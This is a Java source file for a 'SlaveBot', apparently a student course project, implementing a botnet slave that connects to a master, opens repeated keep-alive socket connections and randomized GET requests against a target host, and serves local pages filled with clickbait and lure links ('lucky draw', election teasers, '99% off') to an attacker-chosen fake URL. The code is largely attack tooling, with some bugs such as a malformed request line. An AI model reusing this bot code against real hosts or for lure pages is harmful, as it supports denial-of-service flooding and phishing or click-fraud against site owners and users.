import java.awt.Desktop;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.io.BufferedWriter.*;
import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.net.*;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;

@SuppressWarnings("unchecked")
public class SlaveBot extends Thread {
	
	//Project 3 Declaration Begin
	static int portdec;
	static String fakeURL = "";
	static int interupt1 = 0;

	// Creating an Socket object to act as an interface bw Master and Slave.
	Socket connectingMaster;
	
	// The array list has the connected data in it.
	public static ArrayList<Socket> connected = new ArrayList<>();
		
	// Total Number of Connection List
	public static ArrayList<Socket> totalConnected = new ArrayList<>();
	
	public static void main(String[] args) {


		if (args[0].equals("-h") && args[2].equals("-p"))
		{
			// Creating an instance of listener. Which keeps listening to the Masters Input.
			listener listen1 = new listener(args[1], Integer.parseInt(args[3]));		
		}
		
		else // If inputs are wrong while running the slave, exitting the slave program.
		{
			System.out.println("Please enter the inputs in the below format for running the Slave");
			System.out.println("java SlaveBot -h masterIPAddress -p masterPortNumber");
			System.out.println("Exiting the SlaveBot Program");
			System.exit(-1);
		}
	
		do {
			Scanner inp = new Scanner(System.in);
			String line = inp.nextLine();

			String[] arrayOfString = line.split("\\s+"); // Splits line based on white space betwee them.
			
			if (arrayOfString.length == 5) {
				String serverName = arrayOfString[2];     // IP Address of the Master
				if (serverName.startsWith("www."))
				{
					String temp;
					temp = arrayOfString[2];
					arrayOfString[2] = temp.substring(4, temp.length());
				}
				int portNumber = Integer.parseInt(arrayOfString[4]); // Port Address of the master.
				listener listen2 = new listener(serverName, portNumber);
			}

		}while (true);
	}

	public static class listener {
		private int portNumber;
		private String ipAddress;

		public listener(String ipAddress, int portNumber) {
			this.portNumber = portNumber;
			this.ipAddress = ipAddress;
			try {

				Socket master = new Socket(ipAddress, portNumber);
				totalConnected.add(master);

				System.out.println("Connected to " + master.getRemoteSocketAddress());
			} 
			catch (IOException e) {
				// Commented for Project Purpose - No Extra Prints
				 System.out.println("Exception occurred, exitting the listener object in SlaveBot");
				System.exit(-1);
			}
		}
	}
	// Added to remove the deprecation warnings showing on console.
	@SuppressWarnings("deprecation")
	public void createSocket(Socket fromMaster, int portNumber, String ipAddress, int connections, boolean keepAlive, String url) throws IOException {
		try {
			
			connectingMaster = new Socket();
			
			//System.out.println("Inside create Socket at Slave End");
			
			connectingMaster.connect(new InetSocketAddress(ipAddress, portNumber));
			connected.add(connectingMaster); // Adding the connections to an array list.
			
			if (connectingMaster.isConnected()) {
				System.out.println("\nSlave: "
						+ fromMaster.getRemoteSocketAddress().toString()
						+ " Connected to " + connectingMaster.getInetAddress().toString()
						+ "\nTarget IP: " + connectingMaster.getLocalPort() + "\n");

			}
			
			if(keepAlive)
		        {
		        	//System.out.println("inkeepalive");
				 	// Using the setKeepAlive method in, defined in the Socket Object.
			 	connectingMaster.setKeepAlive(true);
		       	System.out.println("The Keep Alive function is turned on.");
				//System.out.println("Connectivity will be checked after 2 hrs by default\nto keep the connection alive\n");
				//System.out.println(connectingMaster.getKeepAlive());
		        }
			 
		    if(url.length() != 0)
		        {
		        	//System.out.println("in url");
		        	String randString = getRandString();
		        	
		        	DataOutputStream os = new DataOutputStream(connectingMaster.getOutputStream());
			        DataInputStream is = new DataInputStream(connectingMaster.getInputStream());
			        
			        url = url.substring(4, url.length());
			        String temp = url;
			        
			        if(temp.length() == 0)
			        	temp = "https://" + ipAddress + "/" + url + randString;			        
			        else
			        	temp = "https://" + ipAddress + url + randString;
			        
			        url = url + randString;
			        
			        //System.out.println(url);

			        os.writeBytes("GET "+ url + "HTTPS/1.1\r\nHost: "+ ipAddress); //perl command to establish connection.
			        is.available();
			        os.flush();
			        
		            System.out.println(is.readLine() + "\nThe URL used is: "+ temp);
			        //System.out.println("The URL used is: "+ temp);
			        System.out.println("Random string generated: "+ randString);
			        Thread.sleep(1000);
			        //System.out.println("Leaving URL in Slave");
		        }
		}
		catch(IOException e) {
			//e.printStackTrace();
			System.out.println("connection probably lost");
			System.out.println("in exception");
			System.out.println("Terminating abnormally with exit code -1");
		//	System.out.println(attack.getKeepAlive());
		//	System.exit(-1);
			} 
		catch (InterruptedException e) {
			// Commented for Project Purpose - No Extra Prints
			System.out.println("Exception occurred, exitting the createSocket Function in SlaveBot");
			System.exit(-1);
		} 
	}
	
	// Over Riding the create Socket Function for the Project 3rd Part.
	
	public void createSocket(Socket fromMaster, String mode, int portNumber, String URL, int interupt)
	{
		//System.out.println("Hello - Inside Slave");
		
		interupt1 = interupt;
		
		//System.out.println(mode);
		
		HttpServer server = null;
		
		if(mode.equals("rise-fake-url"))
		//while(true)
		{
			//System.out.println("Inside Rise Fake URL");
			//System.out.println("portNumber" + " " + portNumber);
			int port;
			
			if(portNumber > 1000)
			{
				port = portNumber;
			}
			else
			{
				port = 9000;
			}
			portdec = port;
			
			String url = URL;
			
			/*if(url.startsWith("http") || url.startsWith("https"))
				url = URL + "/";				
			else
				url = "http://" + URL + "/";
			*/
			fakeURL = url;
			
			try
			{
				server = HttpServer.create(new InetSocketAddress(portNumber), 0);
				server.createContext("/", new HomePageHandler(fakeURL));
				server.createContext("/page1", new PageHandler(fakeURL, 1));
				server.createContext("/page2", new PageHandler(fakeURL,2 ));
				server.createContext("/page3", new PageHandler(fakeURL, 3));
				server.createContext("/page4", new PageHandler(fakeURL, 4));
				server.createContext("/page5", new PageHandler(fakeURL, 5));
				server.createContext("/page6", new PageHandler(fakeURL, 6));
				server.createContext("/page7", new PageHandler(fakeURL, 7));
				server.createContext("/page8", new PageHandler(fakeURL, 8));
				server.createContext("/page9", new PageHandler(fakeURL, 9));
				server.createContext("/page10", new PageHandler(fakeURL, 10));
				
				System.out.println("server started at " + port);
				
				RootHandler r1 = new RootHandler();
				server.createContext("/", new RootHandler());
				server.createContext("/echoHeader", new EchoHeaderHandler());
				server.createContext("/echoGet", new EchoGetHandler());
				server.createContext("/echoPost", new EchoPostHandler());
				server.setExecutor(null);
				server.start();
						
				String myCommand = "xdg-open http://localhost:";
				myCommand += port;
				//Runtime.getRuntime().exec(myCommand);
		
			}
			catch(IOException e)
			{
				
			}		
			}
		
		else
		{
			System.out.println("Inside down-fake-url");
			
			try{
				
				for (int i = 0; i < connected.size(); i++) 
				{
					connected.get(i).close();
				}
				
				String myCommand = "xdg-open http://localhost:";
				myCommand += portNumber;
				//Runtime.getRuntime().exec(myCommand);
					
				System.out.println("Stopping the Server");
				server.stop(0);
				System.out.println("Stopping the Server test");
			}
			
			catch(IOException e)
			{
				
			}
		}
		
		
	}
	
	// Over Riding create Socket ends.
	
	public void disconnect(int masterPort, String masterAddress) {

		try {

			if (masterPort == 9999) // A default value to disconnect all connections.
			{
			//	masterPort = 80;
				
				for (int i = 0; i < connected.size(); i++) {

					if (!connected.get(i).isClosed()) {
						System.out.println("Connection to "
								+ connected.get(i).getRemoteSocketAddress()
								+ " " + connected.get(i).getLocalPort()
								+ " is closed\n");
						connected.get(i).close();
					}
				}
			}
			else {				
				// System.out.println("Inside Disconnect");

				for (int i = 0; i < connected.size(); i++) {

					// System.out.println("Testing begin");
					// System.out.println(masterPort);
					// System.out.println(connected.get(i).getLocalPort());
					// System.out.println("Testing end");
					
					if (connected.get(i).getLocalPort() == masterPort) {
						System.out.println("Connection to "
								+ connected.get(i).getRemoteSocketAddress()
								+ " " + connected.get(i).getLocalPort()
								+ " is closed\n");
						connected.get(i).close();
					}
				}
			}

		} 
		catch (IOException e) {
			// Commented for Project Purpose - No Extra Prints
			 System.out.println("Exception occurred, exitting the disconnect Function in SlaveBot");
			System.exit(-1);
		}
	}
	
	public static String getRandString() {
	    String RANDCHARS = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	    StringBuilder rand = new StringBuilder();
	    Random rnd = new Random();
	    do {
	        int index = (int) (rnd.nextFloat() * RANDCHARS.length());
	        rand.append(RANDCHARS.charAt(index));
	    }
	    while (rand.length() < 10);
	    
	    String randStr = rand.toString();
	    return randStr;

	}
	
	// Begin
	public class RootHandler implements HttpHandler {

        @Override

        public void handle(HttpExchange he) throws IOException {
        	

			String url = "http://www.google.com/";
			
        	//System.out.println(fakeURL);
        	
			File test1 = new File("testPage1.html");
			FileWriter filetest1 = null;
			BufferedWriter bufferedWriter = null;
			
			filetest1 = new FileWriter(test1);
			bufferedWriter = new BufferedWriter(filetest1);
			
			String htmlPage = "<!DOCTYPE html><html><head><title>Rise of Fake Bots Linker 1</title></head><body><h1>Linker 1</h1>Click <a href=\"" + url + "\">check this out!</a> Something Intresting is waiting for you.<p></p></body></html>";
			bufferedWriter.write(htmlPage);
			
			bufferedWriter.flush();
							
			File test2 = new File("testPage2.html");
			FileWriter filetest2 = null;
			
			filetest2 = new FileWriter(test2);
			bufferedWriter = new BufferedWriter(filetest2);
			
			htmlPage = "<!DOCTYPE html><html><head><title>Rise of Fake Bots Linker 2</title></head><body><h1>Linker 2</h1>Click <a href=\"" + url + "\">check this out!</a> Something More Intresting is waiting for you.<p></p></body></html>";
			bufferedWriter.write(htmlPage);
			
			bufferedWriter.flush();

			
			File file = new File("mainPage.html");
			FileWriter filewriter = null;
			//BufferedWriter bufferedWriter = null;
			
			filewriter = new FileWriter(file);
			bufferedWriter = new BufferedWriter(filewriter);
			
			htmlPage = "<!DOCTYPE html><html><head><title>Rise of Fake Bots Main Page</title></head><body><h1>Rise of Fake Bots</h1>Click <a href=\"testPage1.html\">here</a> here to make this Elections more intresting<p></p>Click <a href=\"testPage2.html\">here</a> here to find out who will win the elections.<p><p></body></html>";
			bufferedWriter.write(htmlPage);
			
			//String myCommand = "xdg-open mainPage.html";
			//Runtime.getRuntime().exec(myCommand);
			
			bufferedWriter.flush();
			filewriter.flush();
			
        	
        	int port = portdec;
                String response = "<h1>Server start success if you see this message</h1>" + "<h1>Port: " + port + "</h1>";
                //response += "Click <a href=\"testPage1.html\">here</a> here to make this Elections more intresting<p></p>";
                response += "<a href=\"https://www.w3schools.com/html/\">Visit our HTML tutorial</a><p></p>";
                
                //response += "<a href=\"https://testPage1.html\">Visit our HTML tutorial</a>";
                
                //file:///F:/VS_2015_WorkSpace/Projects/xyz/Intro.html
                
                //response += "<a href=\"file:/home/neven1/Desktop/Project/testPage1.html\">Visit our HTML tutorial</a>";
                response += "<a href='/page1'>Link 1</a><br/>";
                response += "<a href='/page2'>Link 2</a><br/>";
                response += "<a href='/page3'>Link 3</a><br/>";
                response += "<a href='/page4'>Link 4</a><br/>";
                response += "<a href='/page5'>Link 5</a><br/>";
                response += "<a href='/page6'>Link 6</a><br/>";
                response += "<a href='/page7'>Link 7</a><br/>";
                response += "<a href='/page8'>Link 8</a><br/>";
                response += "<a href='/page9'>Link 9</a><br/>";
                response += "<a href='/page10'>Link 10</a><br/>";
                response += "<a href='//" + fakeURL +"'>check this out!</a><br/></html>";
                
                Headers h = he.getResponseHeaders();
                h.set("Content-Type","text/html");
                
                he.sendResponseHeaders(200, response.length());
                OutputStream os = he.getResponseBody();
                os.write(response.getBytes());
                os.close();
                
        }
}
	
static class PageHandler implements HttpHandler {
		
		public String fakeUrl;
		public int j;
		public PageHandler(String fakeUrl, int i) {
			//this.fakeUrl = fakeUrl;
			fakeUrl = fakeURL;
			j = i;
			
		}
		
        @Override
        public void handle(HttpExchange t) throws IOException {
        	
        
        	
        	String response;
        	
        	response = "<html style=\"color:Orange;\"> <p align=\"center\"> <font size=\"5\"> Linker Page " + j + "</font><p/><br/>"; 

			response += "<a href='/page1'>Link 1</a><br/>";
	        response += "<a href='/page2'>Link 2</a><br/>";
		    //response += "<a href='/page3'>Link 3</a><br/>";
		    ////response += "<a href='/page4'>Link 4</a><br/>";
		    //response += "<a href='/page5'>Link 5</a><br/>";
		    //response += "<a href='/page6'>Link 6</a><br/>";
	        //response += "<a href='/page7'>Link 7</a><br/>";
		    ///response += "<a href='/page8'>Link 8</a><br/>";
		    //response += "<a href='/page9'>Link 9</a><br/>";
		    //response += "<a href='/page10'>Link 10</a><br/>";
	        response += "<a href='/'>HomePage</a><br/>";

	        //response  += "<a href=\"https://www.linkedin.com/in/neerajvenugopal\">here</a>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Check this out!! (Fake URL)</a><br/></html>";
	        response += "<a href='//" + fakeURL +"'><p align=\"left\">Who's winning and who's not.. Wanna know ?? click here..<p/></a><br/></html>";
			response += "<a href='//" + fakeURL +"'><p align=\"left\">Find out who is winning in the recent elections..(Fake URL)<p/></a><br/></html>";
			response += "<a href='//" + fakeURL +"'><p align=\"left\">Happy Thanksgiving, 99% off on our products. Click here..(Fake URL)<p/></a><br/></html>";
			response += "<a href='//" + fakeURL +"'><p align=\"left\">You've been chosen by our lucky draw, Click here for more information..(Fake URL)<p/></a><br/></html>";
			
	            
	        Headers h = t.getResponseHeaders();
	        h.set("Content-Type","text/html");
            
            //server.createContext("/page1", new Page1Handler(fakeUrl));
            
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

    }

static class HomePageHandler implements HttpHandler {
	
	public String fakeUrl;
	public HomePageHandler(String fakeUrl) {
		fakeUrl = fakeURL;
	}
	
    @Override
    public void handle(HttpExchange t) throws IOException {

    	String response = "<html style=\"color:Tomato;\"> <p align=\"center\"> <font size=\"5\"> Project Part 3 - Rise of Fake Bots </font><p/><br/>";  
    	response += "<p align=\"center\"><img src =\"https://vignette.wikia.nocookie.net/dragonball/images/9/9c/Bazinga%21.jpg/revision/latest?cb=20111213033813\"><p/>";
    	response += "<a href='/page1'>Link 1</a><br/>";
    	response += "<a href='/page2'>Link 2</a><br/>";
    	//response += "<a href='/page3'>Link 3</a><br/>";
    	//response += "<a href='/page4'>Link 4</a><br/>";
    	//response += "<a href='/page5'>Link 5</a><br/>";
    	//response += "<a href='/page6'>Link 6</a><br/>";
    	//response += "<a href='/page7'>Link 7</a><br/>";
    	//response += "<a href='/page8'>Link 8</a><br/>";
    	//response += "<a href='/page9'>Link 9</a><br/>";
    	//response += "<a href='/page10'>Link 10</a><br/>";

    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
       	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	response += "<a href='//" + fakeURL +"'>check this out!!(Fake URL)</a><br/></html>";
    	
    	response += "<p><p/>";
    	
    	response  += "<a href=\"https://www.linkedin.com/in/neerajvenugopal\"> <p align=\"right\">Feel free to add me to your connections.</font></a><br/>";
    	
        Headers h = t.getResponseHeaders();
        h.set("Content-Type","text/html");
        
        
        t.sendResponseHeaders(200, response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }

}

	
	public class EchoHeaderHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange he) throws IOException {
        	//int port = 9000;
                Headers headers = he.getRequestHeaders();
                Set<Map.Entry<String, List<String>>> entries = headers.entrySet();
                String response = "";
                for (Map.Entry<String, List<String>> entry : entries)
                         response += entry.toString() + "\n";
                he.sendResponseHeaders(200, response.length());
                OutputStream os = he.getResponseBody();
                os.write(response.toString().getBytes());
                os.close();
        }}
	public class EchoGetHandler implements HttpHandler {

        @Override

        public void handle(HttpExchange he) throws IOException {
        	//int port = 9000;
                // parse request
                Map<String, Object> parameters = new HashMap<String, Object>();
                URI requestedUri = he.getRequestURI();
                String query = requestedUri.getRawQuery();
                parseQuery(query, parameters);

                // send response
                String response = "";
                for (String key : parameters.keySet())
                         response += key + " = " + parameters.get(key) + "\n";
                he.sendResponseHeaders(200, response.length());
                OutputStream os = he.getResponseBody();
                os.write(response.toString().getBytes());

                os.close();
        }
}
	public class EchoPostHandler implements HttpHandler {

        @Override

        public void handle(HttpExchange he) throws IOException {
                // parse request
        	//int port = 9000;
                Map<String, Object> parameters = new HashMap<String, Object>();
                InputStreamReader isr = new InputStreamReader(he.getRequestBody(), "utf-8");
                BufferedReader br = new BufferedReader(isr);
                String query = br.readLine();
                parseQuery(query, parameters);

                // send response
                String response = "";
                for (String key : parameters.keySet())
                         response += key + " = " + parameters.get(key) + "\n";
                he.sendResponseHeaders(200, response.length());
                OutputStream os = he.getResponseBody();
                os.write(response.toString().getBytes());
                os.close();
        }
}
	public static void parseQuery(String query, Map<String, 
			Object> parameters) throws UnsupportedEncodingException {

		         if (query != null) {
		                 String pairs[] = query.split("[&]");
		                 for (String pair : pairs) {
		                          String param[] = pair.split("[=]");
		                          String key = null;
		                          String value = null;
		                          if (param.length > 0) {
		                          key = URLDecoder.decode(param[0], 
		                          	System.getProperty("file.encoding"));
		                          }

		                          if (param.length > 1) {
		                                   value = URLDecoder.decode(param[1], 
		                                   System.getProperty("file.encoding"));
		                          }

		                          if (parameters.containsKey(key)) {
		                                   Object obj = parameters.get(key);
		                                   if (obj instanceof List<?>) {
		                                            List<String> values = (List<String>) obj;
		                                            values.add(value);

		                                   } else if (obj instanceof String) {
		                                            List<String> values = new ArrayList<String>();
		                                            values.add((String) obj);
		                                            values.add(value);
		                                            parameters.put(key, values);
		                                   }
		                          } else {
		                                   parameters.put(key, value);
		                          }
		                 }		         
		  
}
	}
// End
}